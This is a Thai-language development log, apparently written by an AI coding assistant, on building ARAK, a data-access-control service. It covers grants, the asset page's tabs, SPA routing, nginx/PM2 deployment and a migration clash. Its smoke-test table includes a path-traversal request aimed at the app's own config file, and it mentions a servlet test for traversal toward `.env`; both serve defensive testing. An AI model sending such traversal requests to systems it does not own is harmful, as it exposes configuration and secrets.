**สาเหตุ** — `SpaServlet.looksLikeFile()` ตัดสินว่า path ไหนเป็นไฟล์ด้วยกฎ *"segment สุดท้ายมีจุด"* ซึ่งถูกกับ `index-a91f3c.js` แต่ผิดกับทุก route ของแอปนี้ที่ลงท้ายด้วย **FQN** (`/catalog/<service>.<db>.<schema>.<table>`) · pathที่ถูกอ่านว่าเป็นไฟล์ที่หายไป → 404 แทนที่จะคืน `index.html` ให้ router ในเบราว์เซอร์จัดการ

**ผลจริง** — คลิกจากหน้า Catalog เข้าไปได้ปกติ (router เดินในเบราว์เซอร์ ไม่ได้ยิง request) แต่ **กด F5 / เปิด bookmark / แชร์ลิงก์ให้คนอื่น = 404** บนหน้าที่ data owner เปิดบ่อยที่สุด

**แก้** — เปลี่ยนกฎจาก "มีจุด" เป็น **"นามสกุลอยู่ใน `TYPES` ที่ servlet เสิร์ฟได้จริง"** ซึ่งเป็น list ปิดอยู่แล้วในไฟล์เดียวกัน (ใช้ dot ตัวท้าย ไม่ใช่ตัวแรก — `app.min.js` นามสกุลคือ `js`) · `.customer` ไม่ใช่ file type → เป็น route · `.js` ที่หายไปยัง 404 เสียงดังเหมือนเดิม

**บทเรียนสองข้อ**
1. บั๊กนี้ **มองไม่เห็นจาก dev server** — Vite มี SPA fallback ของตัวเองที่คืน `index.html` ให้ทุก path ที่ไม่ใช่ไฟล์ · จะเจอได้ก็ต่อเมื่อเปิด **artifact ตัวที่จะเอาไปลงจริง** เท่านั้น
2. `SpaServlet` **ไม่เคยมีเทสต์เลย** ทั้งที่มันเป็นตัวตัดสินว่า request ไหนเป็นหน้าเว็บ request ไหนเป็นไฟล์ · เพิ่ม `SpaServletTest` 7 เทสต์ (route / ไฟล์ / FQN / asset ที่หายไป / path traversal ออกไปหา `.env` / index ต้องไม่ถูก cache)

### AE.7 วิธีดูของจริงบนเครื่อง dev โดยไม่แตะโค้ด prod

nginx บนเครื่องปลายทางตัด prefix ทิ้งด้วย **slash ท้าย `proxy_pass`** (`proxy_pass http://127.0.0.1:8090/;`) → ตัว service ไม่เคยรู้เลยว่าตัวเองถูก mount ที่ `/Arak/` · แต่ **bundle รู้** เพราะมันสร้าง URL ในเบราว์เซอร์ (`src/basePath.ts` อ่านจาก `<meta name="arak-base">`)

แปลว่า **เปิด jar เดี่ยวๆ ที่ `/Arak/` ไม่ได้** — ไม่มีใครตัด prefix ให้ · วิธีที่ใช้รอบนี้คือเขียน reverse proxy ~40 บรรทัดใน scratchpad ที่ทำสิ่งเดียวกับ `deploy/nginx-arak.conf` (301 จาก `/Arak`, ตัด prefix, ส่งต่อ 8080) แล้วเปิดที่ `http://localhost:8090/Arak/` → **artifact ที่ทดสอบคือไฟล์ตัวเดียวกับที่จะ copy ขึ้น host เป๊ะๆ ไม่ได้ build พิเศษ**

> ทางเลือกที่ **ไม่เลือก**: ทำให้ `SpaServlet` ตัด prefix เองเวลาเจอ · มันจะทำให้ jar เปิดเดี่ยวๆ ได้และกัน `proxy_pass` ที่ลืม slash ท้ายด้วย — แต่เป็นการเพิ่มโค้ดใน prod เพื่อแก้ปัญหาของการดูบนเครื่อง dev และ Jersey ถูก map ที่ `/api/*` ไปแล้ว การ rewrite ต้องไปอยู่ชั้น Jetty handler ก่อน servlet mapping ไม่ใช่ filter ธรรมดา · จดไว้เป็นช่องว่างข้อ 10

---

## รอบก่อนหน้า — FR-7 grant ครบวง · หน้า Asset เป็น 5 แท็บ · และ **ย้าย deploy ไปเป็นแบบเดียวกับแอปอื่นบนเครื่องปลายทาง**

> รอบนี้มีสามเรื่องที่ไม่เกี่ยวกัน และ **บั๊ก schema หนึ่งตัวที่ซ่อนมาตั้งแต่ V3** ซึ่งโผล่ออกมาเพราะเรื่องแรก

### AD.1 FR-7 — grant ตรงระดับ table ครบวง (ผู้ใช้สั่ง)

โจทย์จากผู้ใช้: *"อยากให้สามารถ Grant แบบ Assign ตรง ได้ด้วย คือ Grant ระดับ Table … เข้าตั้งแต่ Start date end date หรือนับถอยหลัง · มีหน้าจอให้ดู ระดับ Table ที่บอกว่า Table นี้ให้ User หรือ group ไหน เข้าได้ จาก การ assign ตรง หรือมาจาก Global policy"*

**เส้นแบ่ง:** policy บอกว่า *ใครเข้าถึง asset กลุ่มไหนได้* · grant บอกว่า *คนนี้ เข้า table นี้ ได้ถึงวันนี้* ทั้งคู่จบที่ `PolicyDecision` ตัวเดียวกัน และ **grant compose แบบ intersection เหมือนทุกอย่าง (FR-5.1)** — เปิดให้ได้ตรงที่ไม่มี policy พูดถึง แต่ **แหก DENY ของ policy ไม่ได้** ถ้า grant ผ่อน global policy ได้เมื่อไหร่ global policy ทุกตัวก็กลายเป็นแค่ข้อเสนอแนะ

| ไฟล์ | บรรทัด | หน้าที่ |
|---|---|---|
| `access/GrantStore.java` | 598 | อ่าน/เขียน grant + เขียน `audit_grant_change` ทุกครั้ง · `asPolicy` แปลง grant เป็น input ของ engine |
| `access/AccessQuery.java` | 291 | "ใครเข้า table นี้ได้บ้าง" — รวมคนที่มาจาก policy กับคนที่มาจาก grant ไว้ในคำตอบเดียว พร้อมบอก origin |
| `access/GrantExpiryJob.java` | 80 | FR-7.2 — ปิด grant ที่หมดอายุ เขียน tombstone ด้วย actor `system` |
| `resources/AccessResource.java` | 177 | `/v1/access/{assets,history,mine,principals}/…` + `POST /grants` + `POST /grants/{id}/revoke` |
| `db/migration/V11__access_grant.sql` | 105 | **ALTER ไม่ใช่ CREATE** — ดูข้อ AD.4 |
| `frontend/app/src/api/access.ts` | 190 | client |
| `pages/catalog/AccessTab.tsx` | 506 | หน้าจอหลัก — คนที่เข้าได้ แยกว่ามาจาก grant หรือจาก policy |
| `pages/catalog/GrantDialog.tsx` | 325 | ฟอร์ม grant — ใคร / นานเท่าไหร่ / ทำไม · นับถอยหลังเป็นปุ่ม (7/30/90/365/ไม่มีวันหมด) default 30 วัน |
| `pages/catalog/AuditTab.tsx` | 135 | trail ของ GRANT / REVOKE / EXPIRE |

**ที่ตั้งใจให้เป็นแบบนี้:**
- **grant ผูกกับ `asset_fqn` ไม่ใช่ `asset.id`** — `asset` เป็น SCD2 ถ้าผูกกับ id แล้ววันหนึ่งมีคนเพิ่ม column สิทธิ์ของทุกคนจะหายเงียบๆ
- **principal มาจากทุกแหล่ง** (local / OpenMetadata team / Entra ในอนาคต) เพราะทั้งหมดเป็นแถวใน `principal` อยู่แล้ว — ตรงกับที่ผู้ใช้สั่งว่า *"เอาทุก group ที่มีอะ local group, openmetadata, entra ในอนาคต"*
- **revoke เป็น tombstone ไม่ใช่ delete** — "เมื่อมีนาคมใครมีสิทธิ์" ต้องตอบได้
- **`reason` บังคับ** — ปีหน้ามันคือ column เดียวที่ยังอธิบายแถวนี้ได้
- **ไม่มี unique constraint บน (asset, principal)** เพราะคนหนึ่งถือ grant สองใบพร้อมกันได้จริง (ใบยืนพื้น + ใบต่ออายุสั้นๆ) · ที่ต้องกันคือ **double-click** → unique index บน `(asset_fqn, principal_id, valid_from)` เฉพาะแถวที่ยังไม่ revoke

**พิสูจน์กับของจริงแล้ว** (2026-09-23 · backend + `dac-appdb` + policy fixture เดิม):

| ขั้น | ผล |
|---|---|
| `GET /v1/access/assets/demo-pg.salesdb.sales.customer` | `analyst_a` (3 policies · mask 2 column · row filter 1) และ `steward_c` (2 policies) — origin `POLICY` ทั้งคู่ |
| `POST /v1/access/grants` ให้ `analyst_b` | **201** · คืน row เต็มพร้อม `grantedBy: admin` |
| `GET /v1/access/assets/…` อีกรอบ | `grants: 1` แต่ **`analyst_b` ยังไม่โผล่ในรายชื่อคนที่เข้าได้** |
| `GET /v1/access/history/…` | `GRANT analyst_b by admin` |
| `POST /v1/access/grants/{id}/revoke` | **200** |
| history อีกรอบ | `REVOKE` + `GRANT` ครบสองแถว · `grants: 0` |

> แถวที่สำคัญที่สุดคือแถวที่สาม — **grant ถูกบันทึกแล้ว แต่ `analyst_b` ยังเข้าไม่ได้** เพราะ policy DENY เขาอยู่ (country SG ≠ dataResidency TH)
>
> ⚠️ **คำอธิบายบรรทัดบนนี้ผิด — ดูข้อ AE.4** · ตอนที่บันทึกนี้ถูกเขียน grant ยังไม่เคยถึง engine เลยสักใบ (ข้อ AE.1) ผลที่เห็นจึงอธิบายได้ทั้งสองทางและการเช็คด้วยมือแยกไม่ออก · ตอนนี้ property นี้มี IT คุมแล้วจริง

### AD.2 หน้า Asset แตกเป็น 5 แท็บ

ผู้ใช้เคยบอกว่า *"หน้าที่เข้าไปดู Asset ยังไม่สวยเลย"* และขอ *"Tab เต็มรูปแบบ: Overview / Access / Policies / Columns / Audit"*

`AssetDetailPage.tsx` 456 → 538 บรรทัด · **หัวหน้าเพจไม่ขยับแม้แต่ byte เดียว** และ panel ทุกอันเป็นของเดิม ย้ายที่อยู่เฉยๆ ตามที่ผู้ใช้กำชับว่า *"เอาให้ทุกอย่าเหมือนเดิมนะ ความสวยงาม หรือทุกอย่าง"*

- **แท็บที่เปิดอยู่อยู่ใน query string** (`?tab=access`) — "ไปดู access ของ table นี้หน่อย" เป็นข้อความที่คนส่งกันจริง ลิงก์ควรพาไปถึงคำตอบ ไม่ใช่พาไปหัวเพจ
- `setSearch(…, { replace: true })` — อ่าน 5 แท็บไม่ควรทิ้ง 5 ขั้นไว้ในปุ่ม back ระหว่างหน้านี้กับ catalog
- `Panel` / `Field` ย้ายไปอยู่ `panels.tsx` เพราะ 3 แท็บใช้ร่วมกันแล้ว ถ้าแต่ละแท็บวาดการ์ดของตัวเองมันจะเลิกดูเหมือนหน้าเดียวกัน
- badge นับจำนวนมีแค่แท็บ Columns — เป็นตัวเดียวที่มีตัวเลขอยู่ในมือแล้ว ตัวอื่นต้องยิง request เพิ่มเพื่อเอาเลขไปแปะบนแท็บที่ยังไม่มีใครเปิด และเลขที่บางทีเป็นตัวเลขบางทีเป็น spinner อ่านแล้วเหมือนระบบพัง

### AD.3 ย้าย deploy ไปเป็นแบบเดียวกับแอปอื่นบนเครื่องปลายทาง — **ไม่ใช่ Docker**

ผู้ใช้ให้เข้าไปดูเครื่อง deploy จริงแล้วถามว่า *"เราเปลี่ยนให้เป็นแบบเขาได้ไหม"* — คำตอบเดิมที่เคยให้ไว้ (docker image) **ใช้กับเครื่องนั้นไม่ได้** เพราะไม่มี Docker ไม่มี Java ของระบบ และไม่มี sudo แบบไม่ต้องถาม

แบบของเขา: **PM2 หนึ่ง process ต่อแอป · แต่ละแอปพอร์ตของตัวเอง · nginx ตัวเดียวข้างหน้าแยกด้วย path prefix** → ARAK ได้ `/Arak/` → `127.0.0.1:8090` (admin 8091)

| ไฟล์ | ทำอะไร |
|---|---|
| `config/WebConfiguration.java` | `web.root` / `web.basePath` / `web.assetCacheSeconds` — **ชี้ไปที่ไดเรกทอรีบนดิสก์ ไม่ใช่ฝังไฟล์ไว้ใน jar** จะได้แก้ CSS แล้ว copy ทับได้โดยไม่ต้องมี Maven บนเครื่องที่ไม่มี Maven |
| `web/SpaServlet.java` (164) | กติกาสองข้อ — **ขอไฟล์ที่มีอยู่ = ได้ไฟล์นั้น** (asset ที่มี hash cache 1 ปี · `index.html` `no-store`) · **ขอ path ที่ไม่มี = ได้ตัวแอป** (SPA fallback) ยกเว้น path ที่หน้าตาเป็นชื่อไฟล์ → 404 ไม่ใช่ยัด HTML ให้ browser ไป parse เป็น script |
| `DacApplication.serveWebApp` + `checkMountPoint` | ติดตั้ง servlet + **เทียบ mount point ที่ bundle ประกาศไว้กับ `web.basePath` ตอน start** |
| `basePath.ts` + meta `arak-base` ใน `index.html` | Vite เขียน `%BASE_URL%` ลง meta tag ตอน build · runtime อ่านจาก meta → router `basename` + axios `baseURL` · **ไม่ใช้ `import.meta.env.BASE_URL`** เพราะ ts-jest รันเป็น CommonJS แล้ว `import.meta` พังทุกเทสต์ที่ import ไฟล์นั้น |
| `deploy/start.sh` | สิ่งที่ PM2 รัน · ไม่มี `.env` ไม่ยอม start · `-XX:MaxRAMPercentage=40` ไม่ใช่ `-Xmx` เพราะเครื่องใช้ร่วมกันหลายแอป · `exec` เพื่อให้ PM2 คุม JVM ตรงๆ |
| `deploy/nginx-arak.conf` | อยู่ในโฟลเดอร์ของแอปเอง เพื่อให้แตะ `/etc/nginx` ครั้งเดียวด้วย `include` บรรทัดเดียว (**ต้องเป็น full path — nginx ไม่ขยาย `~`**) |
| `deploy/DEPLOY.md` | ขั้นตอนทั้งหมด + สองขั้นที่ต้องใช้สิทธิ์ admin (`CREATE ROLE`/`CREATE DATABASE` · include + `nginx -t && systemctl reload`) |

**ทำไมต้องมี `checkMountPoint`:** bundle ที่ build มาเพื่อ `/` แล้วเอาไป mount ที่ `/Arak/` คือ **หน้าขาวเปล่า** ที่เบาะแสเดียวคือ 404 ของไฟล์ที่มีอยู่จริง · ตอนนี้ service log ERROR พร้อมบอกคำสั่ง rebuild ที่ถูกต้อง — และมันทำงานจริง เห็นกับตารอบนี้ (ดูข้อ AD.5)

**ยิงจริงแล้วทั้งหมด** (backend รันพร้อม `APP_WEB_ROOT` + `APP_WEB_BASE_PATH=/Arak/`):

| request | ผล |
|---|---|
| `GET /` | 200 · `text/html` · `no-store, must-revalidate` |
| `GET /assets/index-Dpp5UynE.js` | 200 · `text/javascript` · `public, max-age=31536000, immutable` |
| `GET /catalog` | 200 · html (SPA fallback) |
| `GET /assets/missing.js` | **404** ไม่ใช่ index.html |
| `GET /assets/../../../conf/dac.yml` (`curl --path-as-is`) | **400** — Jetty ตีตกก่อนถึง servlet ด้วยซ้ำ |
| `POST /api/v1/auth/login` (รหัสผิด) | **401 json** — Jersey ยังได้ route ของตัวเอง |
| `GET /api/v1/catalog/assets` (ไม่มี token) | **401 json** |

> nginx ตัด prefix ออกด้วย trailing slash ใน `proxy_pass` → **service ไม่เคยเห็น `/Arak` เลย เห็นแต่ browser** · path ที่ทดสอบข้างบนจึงเป็น path ที่ service จะได้รับจริงหลัง nginx

**ยังไม่ได้ทำ:** ยังไม่ได้ขึ้นเครื่องจริง — บนเครื่องนั้นแตะแค่ `mkdir -p ~/Arak/deploy` ตามที่ผู้ใช้สั่งว่า *"ห้ามแตะของคนอื่น"* · ตอนอ่าน `.env` ของทีมอื่นพิมพ์แต่ชื่อ key ไม่เคยพิมพ์ค่า

### AD.4 🐛 `access_grant` ถูกประกาศไว้สองที่ — V3 กับ V11 ชนกัน

อาการ: backend start ไม่ขึ้นเลย
```
Migration of schema "public" to version "11 - access grant" failed! Changes successfully rolled back.
Message : ERROR: relation "access_grant" already exists
```
แต่ `flyway_schema_history` **ไม่มีแถว v11 เลยสักแถว** ไม่ว่าจะสำเร็จหรือล้มเหลว · และ `access_grant` มีอยู่จริงโดยมี 0 แถว

**เกือบ drop ตารางทิ้งเพราะเข้าใจผิดว่าเป็นของค้างจาก rollback** — ที่ช่วยไว้คือดู `\d access_grant` ก่อน แล้วเห็นว่า column ไม่ตรงกับที่ V11 เขียน (`target_fqn` + `policy_id` แทนที่จะเป็น `asset_fqn`) → `grep -l access_grant *.sql` → **`V3__policy.sql:77` สร้างมันไปแล้วตั้งแต่ migration ที่ 3**

V3 ร่างตารางนี้ไว้ตอนวางโครง policy ล่วงหน้าหลายเดือน ก่อนที่ FR-7 จะมีรูปร่าง · ไม่มีโค้ดไหนเคยอ่านหรือเขียนมันเลย (มีแต่ `TRUNCATE` ใน IT สามไฟล์) และ `GrantStore` ทั้งไฟล์เขียนตามรูปของ V11

**ทางที่เลือก — V11 กลายเป็น ALTER ไม่ใช่ CREATE:** rename `target_fqn` → `asset_fqn` · rename `created_at` → `granted_at` · drop `policy_id` · `reason` เป็น NOT NULL · เพิ่ม `revoke_reason` + constraint 2 ตัว · rename index เดิม + สร้างที่ขาด · แล้วค่อย `CREATE TABLE audit_grant_change`

> **ทำไมไม่ `DROP TABLE` แล้วสร้างใหม่ ทั้งที่ diff สั้นกว่ามาก:** migration ที่ drop ตารางคือ migration ที่ **ทำลายข้อมูลบนทุก database ที่การเดาของ V3 ดันถูกใช้งานจริง** — และ "มั่นใจว่าไม่มี database ไหนเป็นแบบนั้น" เป็นสิ่งที่ migration ตรวจเองไม่ได้ · ยอมเขียนยาวกว่าแล้วถูกทุกที่ดีกว่า

**บทเรียนที่ควรจำ:** ก่อนเขียน migration ใหม่ `grep -l '<ชื่อตาราง>' src/main/resources/db/migration/*.sql` ก่อนเสมอ

**และอีกกับดักที่ตามมาทันที:** แก้ไฟล์ `.sql` แล้ว restart — ยังพังข้อความเดิมเป๊ะ เพราะ **Flyway อ่าน migration จาก classpath คือจากใน jar ไม่ใช่จาก source tree** · ระหว่าง smoke test แก้ชั่วคราวด้วย `jar uf` ยัด resource ตัวใหม่เข้าไป แล้ว build ใหม่ทั้งก้อนทีหลัง

### AD.5 🪤 Git Bash แปลง path ให้เอง — โดนสามครั้งในรอบเดียว

MSYS แปลงค่าที่ **หน้าตาเหมือน absolute path ของ Unix** ก่อนส่งให้โปรแกรม native (`java.exe`, `node.exe`) โดยไม่บอกใคร

| ครั้ง | เขียนไป | โปรแกรมได้รับจริง | อาการ |
|---|---|---|---|
| build | `VITE_BASE=/Arak/ npx vite build` | `/Program Files/Git/Arak/` | build ผ่านสวยงาม · เสิร์ฟแล้ว **หน้าขาว** |
| run | `APP_WEB_BASE_PATH=/Arak/ java -jar …` | `C:/Program Files/Git/Arak/` | `checkMountPoint` ร้อง ERROR ถูกเป๊ะ |
| run (หลังแก้) | `MSYS_NO_PATHCONV=1` + `APP_WEB_ROOT="$PWD/…"` | `C:\c\Users\…` | พอปิดการแปลง `$PWD` ที่เป็น `/c/Users/…` ก็ไม่ถูกแปลงกลับด้วย |

**ทางแก้:** build จาก **PowerShell** (`$env:VITE_BASE='/Arak/'`) · ตอนรันตั้ง `MSYS_NO_PATHCONV=1` **แล้วใช้ `$(pwd -W)` สำหรับ path ที่เป็นไฟล์จริง**

> เป็นปัญหาของเครื่อง dev บน Windows เท่านั้น — บนเครื่อง deploy ที่เป็น Linux ไม่มีอาการนี้ · ที่น่าสนใจกว่าคือ **`checkMountPoint` จับได้ตั้งแต่ตอน start** ซึ่งเป็นเหตุผลที่เขียนมันขึ้นมาพอดี

### AD.6 เทสต์ frontend ที่ต้องแก้เพราะแท็บ (85 → 87)

4 เทสต์ใน `AssetDetailPage.test.tsx` ล้ม เพราะ assert ของที่ย้ายไปอยู่หลังแท็บแล้ว · `renderPage` รับ `tab` เพิ่มแล้วส่งผ่าน **query string ไม่ใช่การคลิก** — เพราะนั่นคือวิธีที่หน้านี้ถูกเปิดจริง ถ้าให้ทุกเทสต์คลิกเข้าไป ทุกเทสต์จะกลายเป็นเทสต์ของแถบแท็บไปด้วย

เพิ่มใหม่ 2 ตัวสำหรับแถบแท็บเอง — เปิดตามที่ลิงก์สั่ง · กดแล้วเปลี่ยนคำตอบจริง

> ตัวหลังเขียนผิดรอบแรก: assert `queryByText('Governance')` ว่าต้องหายไป แต่ **ตารางในแท็บ Columns มี header ชื่อ `Governance` ของตัวเอง** ข้อความจึงเจอทั้งสองแท็บและพิสูจน์อะไรไม่ได้เลย · แก้เป็น `queryByRole('heading', …)`

---

## รอบก่อนหน้า — เส้นแบ่งของ 5.1.1 · หน้า Catalog · และ **ช่องโหว่ที่เจอระหว่างตอบคำถาม**

> รอบนี้ไม่มีโค้ด backend ใหม่เลย — เป็นรอบของ **การตัดสินใจเชิงสถาปัตยกรรมหนึ่งข้อ** (ซึ่งผู้ใช้เป็นคนทัก), **งาน UI หนึ่งหน้า** และ **ช่องโหว่ของ config ที่ไม่มีใครเห็นเพราะระบบไม่ร้อง**

### AC.1 ผู้ใช้ทักว่า 5.1.1 เขียนทับ table เดิม — และทักถูก

คำถามคือ *"ยิง RLS/DDM/GRANT ลง object เดิม — อันนี้คือเขียนทับ table เดิมหรอ ถ้าใช่ ยังไม่ต้องทำดีกว่าไหม"* พร้อมขยายความว่า **"ถ้า Source สามารถ Config ได้ ก็ให้ยิง Config ไป เช่น bigquery"**

ของเดิมใน DESIGN เขียนรวมกันไว้ว่า "native config" ซึ่งซ่อนความจริงว่ามันเป็น**ของสองแบบที่ความเสี่ยงคนละเรื่อง**:

| กลุ่ม | ตัวอย่าง | เกิดอะไรกับ table |
|---|---|---|
| **policy object แยก** | PG `CREATE POLICY` · MSSQL `CREATE SECURITY POLICY` · BigQuery row access policy · Snowflake masking policy | table ไม่เปลี่ยนเลย — เราสร้าง object ใหม่แล้วผูกเข้าไป |
| **เขียนคำนิยามทับ** | **MSSQL DDM** — `ALTER TABLE ... ALTER COLUMN ... ADD MASKED WITH` | **เขียนทับนิยามของ column ที่ลูกค้าเป็นคนสร้าง** |

ตัวที่ผู้ใช้ไม่อยากได้คือกลุ่มล่าง และมีแค่ตัวเดียว → **ตัด DDM ออกจาก Phase 1** ไม่ใช่ตัดทั้ง M6

**บันทึกเป็นกติกาถาวรใน DESIGN ข้อ 8:** ARAK สร้าง/ลบได้เฉพาะ **object ที่ตัวเองเป็นเจ้าของ** (view, policy object, entitlement table) + GRANT/REVOKE เท่านั้น · **ห้าม `ALTER TABLE ... ALTER COLUMN`**

> **เหตุผลที่ชี้ขาดคือ rollback ไม่ใช่ความเสี่ยงตอน apply** — rollback ของ object ที่เราสร้างคือ `DROP` ซึ่งสะอาดเสมอไม่ว่า apply จะพังกลางทางตรงไหน ส่วน rollback ของ `ALTER COLUMN` คือการ**เดาว่าเราจำนิยามเดิมได้ถูก** ถ้าจำผิดคือแก้ schema ของลูกค้าผิดถาวร

**ที่แลกมา (ต้องบอกตรงๆ ไม่ใช่กลบ):** ทิ้ง DDM แล้วจะเสียคุณสมบัติ *"query ตารางชื่อเดิมได้โดยไม่ต้องแก้ report"* เฉพาะส่วน masking — ทางทดแทนคือ **rename swap ใน FR-6.1.1** (`customer` → `customer_raw`, ตั้งชื่อ view ว่า `customer`) ซึ่งให้ผลเท่ากันโดยไม่แตะนิยาม table เลย · และ DDM เองก็ทำ **cell mask ไม่ได้อยู่แล้ว** ของที่เสียไปจึงน้อยกว่าที่คิด

**M6 ถูก re-scope เป็น "push config"** ตามที่ผู้ใช้หมายถึง: ยิงเฉพาะ policy object · **BigQuery row access policy / policy tag กับ Snowflake masking policy คือเคสที่โมเดลนี้เกิดมาเพื่อมัน** (Phase 2) · M6 เลื่อนไปหลัง M5/M7 และเป็น **opt-in ต่อ source** ไม่ใช่ default

ไฟล์ที่แก้: `docs/DESIGN.md` — decision row 6 เขียนใหม่ · **decision row 8 ใหม่** (row secrets เลื่อนเป็น 9) · ตารางเทียบ FR-6 เปลี่ยนหัวข้อเป็น "5.1.1 Push config" และเปลี่ยนแถว "แตะ object เดิม" เป็น "เขียนคำนิยาม table ไหม" · **หัวข้อใหม่ FR-6.2a** ตารางแยกรายคำสั่งว่าอันไหนทำได้/ไม่ได้ · แถว M6 ในตาราง milestone · แถว M3 ที่ status ค้างเก่า

### AC.2 หน้า Catalog — list ที่ให้อ่าน FQN เพื่อเดาว่าของแต่ละแถวคืออะไร

ผู้ใช้บอกว่า *"List ใน Catalog มันจืดๆ ไม่ค่อยสวย"* สาเหตุจริงไม่ใช่เรื่องสี แต่คือ **service / database / schema / table / view ถูก render เหมือนกันหมด** — ผู้อ่านต้องไปไล่อ่าน FQN เองถึงจะรู้ว่าแถวไหนเป็นอะไร

| ของเดิม | ของใหม่ |
|---|---|
| card ลอยเรียงกันด้วย `space-y-3` | **list เดียว border รอบ + `divide-y`** — ได้พื้นที่แนวตั้งคืน ~1/3 |
| badge `type="modern"` สีเทาทุกชนิด | badge `type="color"` สีตามชนิด + **ไอคอนใน tile สีเดียวกัน** |
| กดได้เฉพาะชื่อ (~80px) | **ทั้งแถวเป็นลิงก์** (`absolute inset-0` + `pointer-events-none` บน content, คืน `auto` ให้ชิป) |

สีเรียงตามลำดับชั้นที่มันซ้อนกันจริง เพื่อให้ความลึกอ่านเป็น gradient ไม่ใช่ noise:
`SERVICE` gray-blue (Server01) → `DATABASE` blue (Database01) → `SCHEMA` indigo (Folder) → `TABLE` brand (Table) → `VIEW` purple (Eye) · ชนิดที่ไม่รู้จักตกไป `UNKNOWN_LOOK` สีเทา

> **กับดักที่เจอ (จดไว้เพราะจะเจออีก):** badge `type="modern"` **รับได้แค่ `color="gray"`** เพราะมันใช้ `addonOnlyColors` ไม่ใช่ `filledColors` · ถ้าส่งสีอื่นจะพังตอน `tsc` ไม่ใช่ตอน runtime (`TS2322: Type 'BadgeColors' is not assignable to type '"gray" | undefined'`) · ตัวที่รับทั้ง union คือ `type="color"` และ `type="pill-color"`

> **กับดักที่สอง — ทำ test พังโดยที่ UI ถูก:** ตอนแรกให้ลิงก์คลุมแถวมี accessible name ด้วย `<span className="sr-only">{name}</span>` ผลคือ**ชื่อแถวโผล่ใน DOM สองที่** → `findByText('customer')` เจอสองตัวแล้ว fail · แก้ด้วย `aria-label` บน `<Link />` แทน ซึ่งให้ชื่อกับ screen reader โดยไม่เพิ่ม text node · **บทเรียน: ถ้าจะให้ element ที่มองไม่เห็นมีชื่อ ใช้ attribute ไม่ใช่ข้อความซ้ำ**

ตรวจแล้ว: `tsc --noEmit` ผ่าน · `eslint` ผ่าน · `jest src/pages/catalog` **15/15 ผ่าน**

### AC.3 ⚠️ ช่องโหว่ที่เจอตอนตอบคำถามเรื่อง match — asset 36 จาก 40 ยัง enforce ไม่ได้

ผู้ใช้ถามว่า *"เอา metadata มาจาก openmetadata แล้ว และเราก็ต่อ Datasource ที่ ARAK ด้วย จะ match กันยังไง"*

**กลไกคือจุดเชื่อมจุดเดียว: `data_source.om_service_fqn`** — กรอกมือครั้งเดียวต่อ source ว่า connection นี้ชื่ออะไรในฝั่ง OM ที่เหลือ match เองทั้งหมด เพราะ FQN ของ OM เรียงตามลำดับชั้นอยู่แล้ว:

```
prod-pg    .  SalesDB  .  dbo    .  customer  .  email
└service─┘    └database┘  └schema┘  └ table ─┘   └column┘
    ▲
    └── segment 0 เท่านั้นที่ map มือ
```

`AssetStore.java:534-547` ตัด segment 0 แล้วยิง `SELECT id FROM data_source WHERE om_service_fqn = :fqn AND enabled` → ได้ `data_source_id` แปะให้ทุก asset ใต้ service นั้น · `asset_fqn_map` เก็บพิกัดจริงต่อ object (`database_name`/`schema_name`/`object_name`) + `verification_status` (`UNVERIFIED | MATCHED | ORPHANED | DRIFTED`) ไว้ให้ FR-1.6 เอา JDBC ไปยืนยันกับ source จริง (**ยังไม่ได้ทำ**)

**แต่พอไปเช็ค DB จริง เจอว่ายังไม่ได้เชื่อมเลย:**

```
name    | om_service_fqn | enabled      om_service | linked | count
--------+----------------+---------     -----------+--------+-------
demo-pg |     (NULL)     |    t         demo-pg    |   ใช่   |     4
                                        dtp-iprm   |  ไม่    |    36
```

- `demo-pg` มี `om_service_fqn` เป็น **NULL** → 4 แถวที่ linked มาจาก seed ตอน dev ไม่ได้มาจากการ match
- **36 จาก 40 asset** (31 TABLE · 2 VIEW · SERVICE/DATABASE/SCHEMA อย่างละ 1) มาจาก service `dtp-iprm` ของ OM จริง และ `data_source_id IS NULL` ทั้งหมด
- `asset_fqn_map` มี `MATCHED` อยู่แถวเดียว

> **ตัวปัญหาจริงคือ `.orElse(null)` ที่บรรทัดท้ายของ query นั้น** — match ไม่ได้แล้ว**ไม่ error** เก็บ asset ไว้เฉยๆ แบบ *"รู้จัก แต่ไม่รู้ว่าอยู่เครื่องไหน"* เขียน policy ได้ ติด tag ได้ แต่ **enforce ไม่ได้ query ไม่ได้** และ**หน้าจอไม่บอกอะไรเลย** — ผิดหลัก fail-loud ที่เราถือมาตลอด

**รอผู้ใช้ตอบ** ว่า `demo-pg` คือเครื่องเดียวกับ `dtp-iprm` หรือเปล่า (ถ้าใช่ set `om_service_fqn = 'dtp-iprm'` จบ · ถ้าไม่ใช่ต้องเพิ่ม source ใหม่ซึ่งต้องมี host/port/credential จริง) · และควรเพิ่ม **banner ในหน้า Catalog** ว่า asset เหล่านี้ยังไม่ผูก data source

### AC.4 IT สองตัวล้ม — environment ไม่ใช่โค้ด

`AssetStoreIT` (137.0 s) และ `CatalogQueryIT` (100.4 s) ล้มด้วย `ContainerLaunchException: Container startup failed for image postgres:16-alpine` → `Timed out waiting for log output matching '.*database system is ready to accept connections.*'`

Docker แน่นเพราะรัน backend + Vite + `dac-appdb` + `dac-srcpg` พร้อมกัน · **IT ตัวถัดไปในรอบเดียวกันผ่านหมด** (`GovernanceStoreIT` 10 · `IdentityAdminStoreIT` 15 · `ImpactAnalysisIT` 8) และ unit test **71/71 ผ่าน 0 failures 0 errors** → ยืนยันว่าเป็น resource ไม่ใช่ regression · **ยังต้องรันซ้ำสองตัวนี้ตอน Docker ว่าง**

---

## รอบก่อนหน้า — Decision cache (FR-5.5)

> รอบนี้แตะ backend อย่างเดียว (4 ไฟล์ใหม่ + 9 ไฟล์แก้ + 2 test ใหม่) · **ไม่มี migration** — cache อยู่ใน heap ล้วนๆ · มี config ใหม่ 3 ตัวใน `conf/dac.yml`

### AB. Cache ที่ไม่กล้าตอบคำถามที่ไม่ได้ถูกถาม (FR-5.5)

#### AB.1 ทำไมการ cache ผล decision ถึงอันตรายกว่าที่คิด

cache ทั่วไปตอบผิดแล้วหน้าจอกระตุก หรือตัวเลขผิด — **cache ตัวนี้ตอบผิดแล้วคนที่ไม่ควรเห็นข้อมูลเห็นข้อมูล** และจะไม่มี exception ไม่มี alert ไม่มีอะไรเลย

กับดักที่เห็นได้ชัดที่สุด: cache key ที่เป็น `(principal, asset)` เฉยๆ คือช่องโหว่เต็มๆ — policy ที่อนุญาต 08:00–18:00 พอ 18:00 มันหยุดอนุญาต **โดยที่ไม่มีการเขียนที่ไหนเลย** จึงไม่มีอะไรมา invalidate ให้

